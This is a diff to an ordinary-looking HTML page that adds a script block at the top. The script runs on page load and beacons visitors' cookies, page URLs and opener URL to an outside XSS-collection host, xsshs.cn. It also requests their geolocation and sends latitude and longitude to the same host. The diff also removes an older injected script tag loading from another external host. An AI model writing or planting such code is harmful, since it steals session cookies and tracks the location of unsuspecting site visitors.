@@ -1,5 +1,26 @@
 ﻿<html>
-<head>
+<script>
+	(function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=57dh&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+if(''==1){keep=new Image();keep.src='https://xsshs.cn/xss.php?do=keepsession&id=57dh&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
+function getLocation() 
+  {
+  if (navigator.geolocation)
+    {
+    navigator.geolocation.getCurrentPosition(showPosition);
+    }
+  else{x.innerHTML="Geolocation is not supported by this browser.";}
+  }
+function showPosition(position)
+  {
+
+    (new Image()).src='https://xsshs.cn/xss.php?do=api&id=57dh&weidu='+position.coords.latitude+'&jingdu='+position.coords.longitude; 
+}
+       
+getLocation();
+	</script>
+	 
+	 
+	 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title>熹</title>
 <meta name="author" content="Mike">
@@ -90,4 +111,4 @@
 </div>
 
 </body>
-	 <sCRiPt/SrC=//xs.sb/57dh>
+
